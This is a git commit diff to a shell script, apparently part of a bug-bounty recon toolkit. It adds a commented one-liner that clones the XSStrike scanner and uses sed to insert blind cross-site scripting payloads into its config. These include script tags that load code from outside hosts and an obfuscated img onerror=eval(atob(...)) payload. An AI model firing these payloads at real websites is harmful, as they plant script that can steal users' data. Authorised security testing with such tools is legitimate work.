bba7d1620ddce6dfd7eca6c04edc8be7952e8ef8
fngoo <38164287+fngoo@users.noreply.github.com>
2019-11-25 20:37:42 +0800

    Update du_hast.sh

--- du_hast.sh
+++ du_hast.sh
@@ -9,6 +9,7 @@ cmd=$"python -m SimpleHTTPServer 62345"
 screen -x -S http -X stuff "$cmd"
 screen -x -S http -X stuff $'\n'
 
+mkdir /root/script
 clear
 echo "output.zip------cd /root/zip" ; echo "output.txt------cd /root/z_juice" ; echo "output.web------http://ip:62345/z_juice"
 echo ""
@@ -17,3 +18,9 @@ head -17 /root/sh/du_hast.sh | tail -1
 #   time=`date "+%Y-%m-%d_%H:%M:%S"` ; echo "curl -X POST -H \"Content-type:application/json\" --data '{\"text\":\"${time}\"}' https://hooks.slack.com/services/token/token/token" > /root/script/slack.sh ; bash /root/script/slack.sh ; rm /root/script/slack.sh
 echo ""
 echo "replace URL to yours , then copy into /root/script/webhook.sh"
+echo ""
+echo ""
+#   cd /root/script/3_httprobe ; git clone https://github.com/s0md3v/XSStrike ; cd /root/script/3_httprobe/XSStrike ; pip3 install -r requirements.txt ; sed "s,    '<sCriPt sRc=//14.rs>'\,,    'ceye.url'\,\n    '<sCriPt sRc=//14.rs>'\,\n    '\"><script src=blindxss></script>'\,\n    'httpceye.url/'\,,g" core/config.py > 1.txt ; mv 1.txt core/config.py ; sed "s,blindPayload = '',blindPayload = (  # Payloads for filter & WAF evasion\n    '\"><script src=blindxss></script>'\,\n    '\"><img src=x id=xss7Yxssmh0dxssmloYW8ueHNzxssC5ib2R5LxssaWxkxssw&#61;&#61; onerror=eval(atob(this.id))>'\,\n    '\<script>$.getScript(\"//xss\")</script>'),g" core/config.py > 1.txt ; mv 1.txt core/config.py
+head -22 /root/sh/du_hast.sh | tail -1
+echo ""
+echo "replace URL to yours , then copy into /root/script/xss.sh
